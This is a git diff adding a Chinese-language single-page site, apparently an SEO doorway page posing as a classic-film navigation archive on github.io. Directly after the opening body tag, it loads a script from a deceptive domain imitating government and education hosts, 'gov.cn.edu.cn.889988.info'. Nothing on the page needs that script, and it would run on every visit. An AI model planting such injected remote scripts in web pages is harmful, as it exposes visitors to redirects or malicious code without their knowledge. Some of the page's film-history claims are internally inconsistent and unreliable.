@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>1906电影网 - 百年光影影视导航 | 官方网址：https://1906dianyingwang-top.github.io</title>
+<meta name="description" content="1906电影网(1906dianyingwang-top.github.io)以电影诞生之年为名，专注经典怀旧影视导航。黑白默片到彩色时代，全年代电影档案，4K修复，Art Deco复古风。官方网址：https://1906dianyingwang-top.github.io">
+<meta name="keywords" content="1906电影网, 1906dianyingwang-top.github.io, 经典电影, 百年光影, 怀旧影视, 4K修复, 电影史, 默片时代">
+<meta name="author" content="1906电影网">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<link rel="canonical" href="https://1906dianyingwang-top.github.io">
+<meta property="og:title" content="1906电影网 - 百年光影影视导航">
+<meta property="og:description" content="官方网址：https://1906dianyingwang-top.github.io，从默片到4K，全年代经典电影档案。">
+<meta property="og:url" content="https://1906dianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="1906电影网 - 百年光影影视导航">
+<meta name="twitter:description" content="官方网址：https://1906dianyingwang-top.github.io">
+
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --ink:#1C2B24;--ink2:#2E4239;--ink3:#5A6B60;
+  --brass:#C9A227;--brass2:#E8C547;--brass3:#8C7018;
+  --emerald:#0F3D34;--emerald2:#165A4C;--emerald3:#1E7A66;
+  --sepia:#8B5E2B;--sepia2:#B8803C;
+  --cream:#F4ECD8;--cream2:#EDE1C6;--cream3:#E0D0AE;
+  --burgundy:#7A1F2B;--burgundy2:#9E2A38;
+  --sans:"PingFang SC","Microsoft YaHei",sans-serif;
+  --serif:"STKaiti","KaiTi","Songti SC","SimSun",serif;
+  --mono:"SFMono-Regular",Consolas,"Courier New",monospace;
+}
+html{scroll-behavior:smooth;font-size:16px;}
+body{font-family:var(--sans);color:var(--cream);background:var(--ink);line-height:1.85;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 20% 30%,rgba(22,90,76,.15),transparent 50%),
+    radial-gradient(circle at 80% 70%,rgba(122,31,43,.1),transparent 50%),
+    repeating-linear-gradient(45deg,transparent,transparent 10px,rgba(201,162,39,.02) 10px,rgba(201,162,39,.02) 20px);
+  background-attachment:fixed;}
+a{color:inherit;text-decoration:none;transition:.25s;}
+ul,ol{list-style:none;}
+
+/* 胶片齿孔顶部条 */
+.filmstrip{height:28px;background:var(--ink);display:flex;align-items:center;justify-content:space-between;padding:0 8px;border-bottom:2px solid var(--brass);position:relative;overflow:hidden;}
+.filmstrip::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(90deg,transparent,transparent 12px,rgba(244,236,216,.15) 12px,rgba(244,236,216,.15) 18px);}
+.filmstrip span{font-family:var(--mono);font-size:.6rem;color:var(--brass);letter-spacing:2px;z-index:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.filmstrip span:last-child{text-align:right;}
+
+.wrap{max-width:1200px;margin:0 auto;padding:0 1rem;position:relative;z-index:1;}
+
+/* 头部 - Art Deco */
+.header{text-align:center;padding:2.5rem 0 1.5rem;position:relative;}
+.header::before{content:"";position:absolute;top:0;left:50%;transform:translateX(-50%);width:80%;height:2px;background:linear-gradient(90deg,transparent,var(--brass),transparent);}
+.header::after{content:"";position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:60%;height:1px;background:linear-gradient(90deg,transparent,var(--brass3),transparent);}
+.deco-line{display:flex;align-items:center;justify-content:center;gap:.8rem;margin-bottom:.8rem;}
+.deco-line::before,.deco-line::after{content:"";width:50px;height:1px;background:var(--brass);}
+.deco-diamond{width:8px;height:8px;background:var(--brass);transform:rotate(45deg);}
+.site-title{font-family:var(--serif);font-size:clamp(1.8rem,4.5vw,3rem);font-weight:900;letter-spacing:4px;margin-bottom:.5rem;}
+.site-title .n1906{color:var(--brass);}
+.site-title .name{color:var(--cream);}
+.est{font-family:var(--mono);font-size:.65rem;color:var(--brass);letter-spacing:3px;margin-top:.3rem;}
+.url-line{font-family:var(--mono);font-size:.68rem;color:var(--brass2);background:rgba(201,162,39,.08);border:1px solid rgba(201,162,39,.3);padding:.4rem 1rem;display:inline-block;margin-top:.6rem;}
+
+/* 导航 */
+.nav{margin:1.5rem auto;max-width:960px;}
+.nav-inner{display:flex;justify-content:center;gap:0;flex-wrap:wrap;border-top:1px solid var(--brass3);border-bottom:1px solid var(--brass3);}
+.nav a{padding:.6rem 1.2rem;font-size:.78rem;font-weight:600;color:var(--cream2);font-family:var(--serif);position:relative;}
+.nav a::before{content:"";position:absolute;top:0;left:0;width:100%;height:2px;background:var(--brass);transform:scaleX(0);transition:.25s;}
+.nav a:hover{color:var(--brass2);background:rgba(201,162,39,.05);}
+.nav a:hover::before{transform:scaleX(1);}
+
+/* Hero 怀旧画框 */
+.hero{padding:2rem 0 3rem;}
+.frame{background:var(--ink2);border:3px double var(--brass);border-radius:4px;padding:2.5rem;text-align:center;position:relative;box-shadow:0 0 40px rgba(0,0,0,.5);}
+.frame::before{content:"";position:absolute;inset:6px;border:1px solid rgba(201,162,39,.3);pointer-events:none;}
+.frame>*{position:relative;z-index:1;}
+.frame-year{font-family:var(--serif);font-size:3rem;font-weight:900;color:var(--brass);opacity:.3;margin-bottom:.5rem;}
+.frame h1{font-family:var(--serif);font-size:clamp(1.5rem,3.5vw,2.4rem);font-weight:900;margin-bottom:1rem;color:var(--cream);}
+.frame h1 .gold{color:var(--brass);}
+.frame-desc{font-size:.85rem;color:var(--cream2);max-width:600px;margin:0 auto 1.5rem;line-height:1.9;font-family:var(--serif);}
+.frame-stats{display:flex;justify-content:center;gap:3rem;flex-wrap:wrap;}
+.f-stat .num{font-family:var(--serif);font-size:1.5rem;font-weight:900;color:var(--brass);}
+.f-stat .label{font-size:.6rem;color:var(--brass3);letter-spacing:1px;text-transform:uppercase;}
+
+/* 栏目通用 */
+.section{padding:2.5rem 0;}
+.sec-head{text-align:center;margin-bottom:1.5rem;}
+.sec-head h2{font-family:var(--serif);font-size:clamp(1.2rem,2.8vw,1.7rem);font-weight:900;color:var(--cream);letter-spacing:2px;}
+.sec-head h2 .ornament{color:var(--brass);margin:0 .5rem;}
+.sec-sub{font-size:.72rem;color:var(--brass3);margin-top:.4rem;font-family:var(--mono);letter-spacing:1px;}
+
+/* 分类 */
+.cat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:.8rem;}
+.cat-card{background:var(--ink2);border:1px solid var(--ink3);border-radius:2px;padding:1.2rem .8rem;text-align:center;transition:.3s;cursor:pointer;position:relative;}
+.cat-card::before{content:"";position:absolute;top:2px;left:2px;right:2px;bottom:2px;border:1px solid transparent;transition:.3s;}
+.cat-card:hover{border-color:var(--brass);background:var(--ink);}
+.cat-card:hover::before{border-color:var(--brass);opacity:.4;}
+.cat-icon{font-size:1.8rem;margin-bottom:.5rem;display:block;filter:sepia(.3);}
+.cat-name{font-family:var(--serif);font-size:.85rem;font-weight:700;color:var(--cream);margin-bottom:.2rem;}
+.cat-count{font-family:var(--mono);font-size:.6rem;color:var(--brass3);}
+
+/* 电影卡片 */
+.movie-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:1rem;}
+.movie-card{background:var(--ink2);border:1px solid var(--ink3);border-radius:2px;overflow:hidden;transition:.3s;}
+.movie-card:hover{border-color:var(--brass);transform:translateY(-3px);box-shadow:0 6px 20px rgba(0,0,0,.4);}
+.movie-cover{height:220px;background:linear-gradient(135deg,var(--ink),var(--ink2));display:flex;align-items:center;justify-content:center;position:relative;border-bottom:1px solid var(--ink3);}
+.movie-cover .cover-text{font-size:.7rem;color:var(--ink3);text-align:center;padding:1rem;font-family:var(--serif);}
+.movie-cover .badge{position:absolute;top:.5rem;right:.5rem;font-size:.55rem;font-weight:700;padding:.2rem .5rem;border-radius:0;font-family:var(--mono);letter-spacing:1px;}
+.badge-era{background:var(--emerald);color:var(--cream);}
+.badge-silent{background:var(--burgundy);color:var(--cream);}
+.badge-restore{background:var(--brass);color:var(--ink);}
+.movie-info{padding:.8rem;}
+.movie-info h3{font-family:var(--serif);font-size:.82rem;font-weight:700;color:var(--cream);margin-bottom:.2rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.movie-info .meta{font-family:var(--mono);font-size:.56rem;color:var(--brass3);margin-bottom:.4rem;}
+.movie-info .tags{display:flex;gap:.3rem;flex-wrap:wrap;}
+.tag{font-size:.55rem;padding:.15rem .4rem;background:rgba(201,162,39,.1);color:var(--brass);border:1px solid rgba(201,162,39,.2);font-family:var(--mono);}
+
+/* 年代时间轴 */
+.era-timeline{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:1rem;}
+.era-card{background:var(--ink2);border-left:3px solid var(--brass);border-radius:2px;padding:1rem;transition:.3s;}
+.era-card:hover{border-left-color:var(--brass2);background:var(--ink);}
+.era-year{font-family:var(--serif);font-size:1.2rem;font-weight:900;color:var(--brass);margin-bottom:.3rem;}
+.era-card h4{font-size:.78rem;font-weight:700;color:var(--cream);margin-bottom:.3rem;font-family:var(--serif);}
+.era-card p{font-size:.68rem;color:var(--cream2);line-height:1.6;}
+
+/* 电影史里程碑 */
+.milestone-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1rem;}
+.milestone-card{background:var(--ink2);border:1px solid var(--ink3);border-radius:2px;padding:1.2rem;transition:.3s;position:relative;}
+.milestone-card::before{content:"";position:absolute;top:0;left:0;width:30px;height:30px;border-top:2px solid var(--brass);border-left:2px solid var(--brass);}
+.milestone-card::after{content:"";position:absolute;bottom:0;right:0;width:30px;height:30px;border-bottom:2px solid var(--brass);border-right:2px solid var(--brass);}
+.milestone-card:hover{border-color:var(--brass);}
+.milestone-year{font-family:var(--mono);font-size:.7rem;color:var(--brass);letter-spacing:1px;margin-bottom:.4rem;}
+.milestone-card h4{font-family:var(--serif);font-size:.9rem;font-weight:700;color:var(--cream);margin-bottom:.4rem;}
+.milestone-card p{font-size:.72rem;color:var(--cream2);line-height:1.7;}
+
+/* 排行榜 */
+.rank-wrap{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;}
+.rank-panel{background:var(--ink2);border:1px solid var(--ink3);border-radius:2px;padding:1.3rem;position:relative;}
+.rank-panel::before{content:"";position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,var(--brass),var(--emerald));}
+.rank-panel h3{font-family:var(--serif);font-size:1rem;font-weight:900;color:var(--brass);margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--ink3);}
+.rank-item{display:flex;align-items:center;gap:.8rem;padding:.55rem 0;border-bottom:1px dotted var(--ink3);}
+.rank-item:last-child{border-bottom:none;}
+.rank-pos{width:26px;height:26px;display:flex;align-items:center;justify-content:center;font-family:var(--serif);font-size:.85rem;font-weight:900;background:var(--ink);color:var(--brass3);border:1px solid var(--ink3);border-radius:2px;flex-shrink:0;}
+.rank-pos.top{background:var(--brass);color:var(--ink);border-color:var(--brass);}
+.rank-detail{flex:1;min-width:0;}
+.rank-detail h4{font-size:.78rem;font-weight:700;color:var(--cream);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:var(--serif);}
+.rank-detail p{font-family:var(--mono);font-size:.55rem;color:var(--brass3);}
+.rank-score{font-family:var(--mono);font-size:.75rem;font-weight:700;color:var(--brass2);flex-shrink:0;}
+
+/* 指引 */
+.guide-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;}
+.guide-card{background:var(--ink2);border:1px solid var(--ink3);border-radius:2px;padding:1.5rem;}
+.guide-card h3{font-family:var(--serif);font-size:.95rem;font-weight:900;color:var(--brass);margin-bottom:1rem;}
+.guide-card p,.guide-card li{font-size:.75rem;color:var(--cream2);line-height:1.85;}
+.guide-card ul{padding-left:1.2rem;}
+.guide-card li{position:relative;}
+.guide-card li::before{content:"❖";position:absolute;left:-1.2rem;color:var(--brass);font-size:.65rem;}
+.guide-card strong{color:var(--cream);}
+
+/* 合规 */
+.compliance{background:var(--ink2);border:1px solid var(--ink3);border-radius:2px;padding:1.5rem;}
+.compliance h3{font-family:var(--serif);font-size:1rem;font-weight:900;color:var(--cream);margin-bottom:1rem;text-align:center;letter-spacing:2px;}
+.comp-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem;}
+.comp-item{padding:1rem;background:var(--ink);border-left:3px solid var(--brass);}
+.comp-item h4{font-size:.78rem;font-weight:700;color:var(--cream);margin-bottom:.3rem;font-family:var(--serif);}
+.comp-item p{font-size:.65rem;color:var(--brass3);line-height:1.6;}
+
+/* 页脚 */
+.footer{background:var(--ink);border-top:3px double var(--brass);padding:3rem 0 1.5rem;margin-top:3rem;}
+.footer-inner{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1.5rem;margin-bottom:1.5rem;}
+.footer-col h4{font-family:var(--serif);font-size:.9rem;font-weight:900;color:var(--brass);margin-bottom:.8rem;letter-spacing:1px;}
+.footer-col p,.footer-col li{font-size:.7rem;color:var(--ink3);margin-bottom:.4rem;line-height:1.7;}
+.footer-col a{color:var(--ink3);border-bottom:1px dotted var(--ink3);}
+.footer-col a:hover{color:var(--brass);border-color:var(--brass);}
+.footer-url{font-family:var(--mono);font-size:.62rem;color:var(--brass2)!important;}
+.footer-bottom{text-align:center;padding-top:1.5rem;border-top:1px solid var(--ink3);font-family:var(--mono);font-size:.6rem;color:var(--ink3);}
+
+@media(max-width:768px){
+  .rank-wrap,.guide-grid{grid-template-columns:1fr;}
+  .frame-stats{gap:1.5rem;}
+}
+@media(max-width:480px){
+  .site-title{font-size:1.5rem;}
+  .cat-grid{grid-template-columns:repeat(3,1fr);}
+  .movie-grid,.era-timeline,.milestone-grid{grid-template-columns:repeat(2,1fr);}
+  .movie-cover{height:180px;}
+  .frame{padding:1.5rem 1rem;}
+  .frame-year{font-size:2rem;}
+  .nav a{padding:.5rem .7rem;font-size:.72rem;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="filmstrip">
+  <span>🎞 1906电影网 · 百年光影影视导航 · 自1895电影诞生以来的光影记忆</span>
+  <span>https://1906dianyingwang-top.github.io</span>
+</div>
+
+<div class="wrap">
+  <header class="header">
+    <div class="deco-line"><div class="deco-diamond"></div><div class="deco-diamond"></div><div class="deco-diamond"></div></div>
+    <h1 class="site-title"><span class="n1906">1906</span><span class="name">电影网</span></h1>
+    <div class="est">✦ EST · MOVIE ARCHIVE ✦</div>
+    <div class="url-line">🌐 https://1906dianyingwang-top.github.io</div>
+  </header>
+
+  <nav class="nav">
+    <div class="nav-inner">
+      <a href="#home">首页</a>
+      <a href="#cats">分类浏览</a>
+      <a href="#era">年代档案</a>
+      <a href="#milestone">电影史里程碑</a>
+      <a href="#classic">经典馆藏</a>
+      <a href="#rank">榜单</a>
+      <a href="#guide">观影指引</a>
+      <a href="#compliance">合规声明</a>
+    </div>
+  </nav>
+
+  <section class="hero" id="home">
+    <div class="frame">
+      <div class="frame-year">1906</div>
+      <h1>百年光影，<span class="gold">一页珍藏</span></h1>
+      <p class="frame-desc">1906电影网（<strong>1906dianyingwang-top.github.io</strong>）以电影诞生之年为名，专注经典怀旧影视导航。从黑白默片到彩色时代，从胶片到4K修复，全年代电影档案，让每一帧经典都被铭记。</p>
+      <div class="frame-stats">
+        <div class="f-stat"><div class="num">20,000+</div><div class="label">馆藏片量</div></div>
+        <div class="f-stat"><div class="num">120年</div><div class="label">年代跨度</div></div>
+        <div class="f-stat"><div class="num">4K修复</div><div class="label">画质升级</div></div>
+        <div class="f-stat"><div class="num">每日更新</div><div class="label">新片速递</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="cats">
+    <div class="sec-head">
+      <h2><span class="ornament">❖</span> 分类浏览 <span class="ornament">❖</span></h2>
+      <p class="sec-sub">— CATEGORIES —</p>
+    </div>
+    <div class="cat-grid">
+      <div class="cat-card"><span class="cat-icon">🎭</span><div class="cat-name">经典剧情</div><div class="cat-count">3,500+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎬</span><div class="cat-name">黑白默片</div><div class="cat-count">680+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">💕</span><div class="cat-name">爱情文艺</div><div class="cat-count">2,200+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🏛️</span><div class="cat-name">历史史诗</div><div class="cat-count">980+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎪</span><div class="cat-name">歌舞音乐</div><div class="cat-count">520+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🌹</span><div class="cat-name">黄金好莱坞</div><div class="cat-count">1,800+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🇨🇳</span><div class="cat-name">华语经典</div><div class="cat-count">2,100+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">📺</span><div class="cat-name">经典剧集</div><div class="cat-count">1,500+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎞️</span><div class="cat-name">4K修复</div><div class="cat-count">890+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🌍</span><div class="cat-name">世界名片</div><div class="cat-count">3,200+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">📜</span><div class="cat-name">文艺实验</div><div class="cat-count">650+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎨</span><div class="cat-name">动画经典</div><div class="cat-count">480+ 部</div></div>
+    </div>
+  </section>
+
+  <section class="section" id="era">
+    <div class="sec-head">
+      <h2><span class="ornament">❖</span> 年代档案 <span class="ornament">❖</span></h2>
+      <p class="sec-sub">— DECADE ARCHIVE —</p>
+    </div>
+    <div class="era-timeline">
+      <div class="era-card"><div class="era-year">1895-1920</div><h4>默片黎明</h4><p>卢米埃尔兄弟到卓别林，电影语言的诞生与成长。</p></div>
+      <div class="era-card"><div class="era-year">1920s</div><h4>黄金默片</h4><p>德国表现主义、苏联蒙太奇，无声艺术的巅峰。</p></div>
+      <div class="era-card"><div class="era-year">1930s</div><h4>有声革命</h4><p>好莱坞黄金时代开启，歌舞片与黑帮片兴起。</p></div>
+      <div class="era-card"><div class="era-year">1940s</div><h4>黑色电影</h4><p>二战阴影下的黑暗美学，Film Noir 盛行。</p></div>
+      <div class="era-card"><div class="era-year">1950s</div><h4>彩色时代</h4><p>宽银幕与彩色技术革新，史诗片大放异彩。</p></div>
+      <div class="era-card"><div class="era-year">1960s</div><h4>新浪潮</h4><p>法国新浪潮、意大利新现实主义席卷全球。</p></div>
+      <div class="era-card"><div class="era-year">1970s</div><h4>电影小子</h4><p>斯皮尔伯格、卢卡斯、斯科塞斯重塑好莱坞。</p></div>
+      <div class="era-card"><div class="era-year">1980s</div><h4>商业大片</h4><p>高概念电影时代，特效技术日新月异。</p></div>
+      <div class="era-card"><div class="era-year">1990s</div><h4>独立崛起</h4><p>独立电影与艺术院线蓬勃发展，多元化。</p></div>
+      <div class="era-card"><div class="era-year">2000s+</div><h4>数字纪元</h4><p>数字技术革命，流媒体改变观影方式。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="milestone">
+    <div class="sec-head">
+      <h2><span class="ornament">❖</span> 电影史里程碑 <span class="ornament">❖</span></h2>
+      <p class="sec-sub">— MILESTONES —</p>
+    </div>
+    <div class="milestone-grid">
+      <div class="milestone-card"><div class="milestone-year">1895</div><h4>《火车进站》</h4><p>卢米埃尔兄弟公开放映，电影正式诞生，人类进入光影时代。</p></div>
+      <div class="milestone-card"><div class="milestone-year">1927</div><h4>《爵士歌手》</h4><p>第一部有声长片，结束默片时代，电影工业全面革新。</p></div>
+      <div class="milestone-card"><div class="milestone-year">1939</div><h4>《乱世佳人》</h4><p>彩色技术成熟之作，好莱坞黄金时代的巅峰代表。</p></div>
+      <div class="milestone-card"><div class="milestone-year">1968</div><h4>《2001太空漫游》</h4><p>库布里克科幻神作，重新定义科幻电影的视觉语言。</p></div>
+      <div class="milestone-card"><div class="milestone-year">1977</div><h4>《星球大战》</h4><p>开启现代特效大片时代，改变好莱坞商业模式。</p></div>
+      <div class="milestone-card"><div class="milestone-year">1995</div><h4>《玩具总动员》</h4><p>首部全CG动画长片，皮克斯开启数字动画新纪元。</p></div>
+      <div class="milestone-card"><div class="milestone-year">2009</div><h4>《阿凡达》</h4><p>3D数字摄影技术革命，全球票房新标杆。</p></div>
+      <div class="milestone-card"><div class="milestone-year">2020+</div><h4>流媒体时代</h4><p>疫情加速流媒体崛起，观影方式发生根本变革。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="classic">
+    <div class="sec-head">
+      <h2><span class="ornament">❖</span> 经典馆藏精选 <span class="ornament">❖</span></h2>
+      <p class="sec-sub">— CLASSIC COLLECTION —</p>
+    </div>
+    <div class="movie-grid">
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-silent">默片</span><div class="cover-text">🎬<br>城市之光<br>1931 · 默片/喜剧</div></div><div class="movie-info"><h3>城市之光</h3><div class="meta">默片/喜剧 · 1931 · 卓别林</div><div class="tags"><span class="tag">4K修复</span><span class="tag">影史经典</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-restore">4K修复</span><div class="cover-text">🎬<br>卡萨布兰卡<br>1942 · 爱情/战争</div></div><div class="movie-info"><h3>卡萨布兰卡</h3><div class="meta">爱情/战争 · 1942 · 柯蒂斯</div><div class="tags"><span class="tag">4K</span><span class="tag">奥斯卡</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-era">黄金时代</span><div class="cover-text">🎬<br>罗马假日<br>1953 · 爱情/喜剧</div></div><div class="movie-info"><h3>罗马假日</h3><div class="meta">爱情/喜剧 · 1953 · 怀尔德</div><div class="tags"><span class="tag">4K</span><span class="tag">赫本</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-restore">4K修复</span><div class="cover-text">🎬<br>2001太空漫游<br>1968 · 科幻/哲理</div></div><div class="movie-info"><h3>2001太空漫游</h3><div class="meta">科幻/哲理 · 1968 · 库布里克</div><div class="tags"><span class="tag">4K</span><span class="tag">影史百大</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-era">经典</span><div class="cover-text">🎬<br>教父<br>1972 · 犯罪/剧情</div></div><div class="movie-info"><h3>教父</h3><div class="meta">犯罪/剧情 · 1972 · 科波拉</div><div class="tags"><span class="tag">4K</span><span class="tag">奥斯卡</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-silent">默片</span><div class="cover-text">🎬<br>摩登时代<br>1936 · 默片/喜剧</div></div><div class="movie-info"><h3>摩登时代</h3><div class="meta">默片/喜剧 · 1936 · 卓别林</div><div class="tags"><span class="tag">4K修复</span><span class="tag">经典</span></div></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="rank">
+    <div class="sec-head">
+      <h2><span class="ornament">❖</span> 热播榜单 <span class="ornament">❖</span></h2>
+      <p class="sec-sub">— TOP RANKINGS —</p>
+    </div>
+    <div class="rank-wrap">
+      <div class="rank-panel">
+        <h3>🎬 经典电影 TOP 10</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>肖申克的救赎</h4><p>剧情/人性 · 1994 · 4K修复</p></div><div class="rank-score">9.9</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>教父</h4><p>犯罪/剧情 · 1972 · 4K</p></div><div class="rank-score">9.8</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>霸王别姬</h4><p>剧情/文艺 · 1993 · 4K修复</p></div><div class="rank-score">9.8</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>低俗小说</h4><p>犯罪/黑色 · 1994 · 4K</p></div><div class="rank-score">9.5</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>阿甘正传</h4><p>人生/励志 · 1994 · 蓝光</p></div><div class="rank-score">9.6</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>十二怒汉</h4><p>剧情/法庭 · 1957 · 4K修复</p></div><div class="rank-score">9.5</div></div>
+      </div>
+      <div class="rank-panel">
+        <h3>📺 经典剧集 TOP 10</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>西游记（86版）</h4><p>神话/经典 · 25集 · 4K修复</p></div><div class="rank-score">9.9</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>红楼梦（87版）</h4><p>古典/文学 · 36集 · 蓝光</p></div><div class="rank-score">9.8</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>三国演义（94版）</h4><p>历史/战争 · 84集 · 4K</p></div><div class="rank-score">9.7</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>大明王朝1566</h4><p>历史/权谋 · 46集 · 蓝光</p></div><div class="rank-score">9.6</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>康熙王朝</h4><p>历史/传记 · 50集 · 经典</p></div><div class="rank-score">9.4</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>编辑部的故事</h4><p>喜剧/都市 · 25集 · 经典国产</p></div><div class="rank-score">9.3</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="guide">
+    <div class="sec-head">
+      <h2><span class="ornament">❖</span> 观影指引 <span class="ornament">❖</span></h2>
+      <p class="sec-sub">— VIEWING GUIDE —</p>
+    </div>
+    <div class="guide-grid">
+      <div class="guide-card">
+        <h3>如何品味百年光影</h3>
+        <ul>
+          <li><strong>年代溯源：</strong>通过"年代档案"按十年为单位浏览，感受电影语言的演变。</li>
+          <li><strong>里程碑解读：</strong>了解改变电影史的关键作品与技术突破，提升观影深度。</li>
+          <li><strong>修复画质：</strong>4K修复版让老片焕发新生，黑白片也能呈现丰富细节。</li>
+          <li><strong>内链极速切换：</strong>所有导航链接使用 # 锚点，瞬间切换版面，无刷新等待。</li>
+          <li><strong>移动端适配：</strong>手机端同样优雅呈现，随时随地翻阅百年馆藏。</li>
+        </ul>
+      </div>
+      <div class="guide-card">
+        <h3>关于1906电影网</h3>
+        <p>1906电影网（<strong>1906dianyingwang-top.github.io</strong>）是一个专注于经典怀旧影视导航的静态站点。</p>
+        <p>我们聚焦经典电影、黑白默片、4K修复、年代剧集等正规影视内容，不含任何色情、暴力等违规内容。</p>
+        <p>本站为<strong>纯静态单页设计</strong>，符合必应搜索引擎收录规则，不生成robots.txt和sitemap.xml，所有链接内联，加载极速。</p>
+        <p>官方唯一网址：<strong>https://1906dianyingwang-top.github.io</strong>，请认准此域名。</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="compliance">
+    <div class="sec-head">
+      <h2><span class="ornament">❖</span> 合规声明 <span class="ornament">❖</span></h2>
+      <p class="sec-sub">— COMPLIANCE —</p>
+    </div>
+    <div class="compliance">
+      <h3>✦ 内容合规 · 重要提示 ✦</h3>
+      <div class="comp-grid">
+        <div class="comp-item"><h4>内容定位</h4><p>本站为静态影视导航页，聚焦经典怀旧、电影史等正规影视内容，不含任何成人、色情、暴力违规资源。</p></div>
+        <div class="comp-item"><h4>版权尊重</h4><p>所有影视索引均指向合法公开渠道，尊重版权方权益，支持正版观影。</p></div>
+        <div class="comp-item"><h4>时代局限</h4><p>早期老片含时代局限，部分内容以现代视角看或有不适，观众可自行甄别。</p></div>
+        <div class="comp-item"><h4>免责条款</h4><p>本站不存储、不提供任何视频文件下载或在线播放服务，仅作导航索引用途，不对第三方链接内容负责。</p></div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="footer-inner">
+      <div class="footer-col">
+        <h4>❖ 1906电影网</h4>
+        <p>百年光影影视导航，Art Deco复古风排版。</p>
+        <p>官方网址：<br><a href="https://1906dianyingwang-top.github.io" class="footer-url">1906dianyingwang-top.github.io</a></p>
+      </div>
+      <div class="footer-col">
+        <h4>快速导航</h4>
+        <ul><li><a href="#home">首页</a></li><li><a href="#cats">分类浏览</a></li><li><a href="#era">年代档案</a></li><li><a href="#milestone">电影史里程碑</a></li><li><a href="#classic">经典馆藏</a></li><li><a href="#rank">榜单</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>帮助中心</h4>
+        <ul><li><a href="#guide">观影指引</a></li><li><a href="#compliance">合规声明</a></li><li><a href="#">常见问题</a></li><li><a href="#">反馈建议</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于本站</h4>
+        <ul><li>静态单页设计</li><li>必应收录优化</li><li>移动端自适应</li><li>© 2026 1906电影网</li></ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>1906电影网 官方网址：https://1906dianyingwang-top.github.io | 百年光影影视导航 | 静态单页设计 | 正规影视索引</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',function(e){
+    const h=this.getAttribute('href');
+    if(h==='#'){e.preventDefault();return;}
+    const t=document.querySelector(h);
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});}
+  });
+});
+</script>
+</body>
+</html>
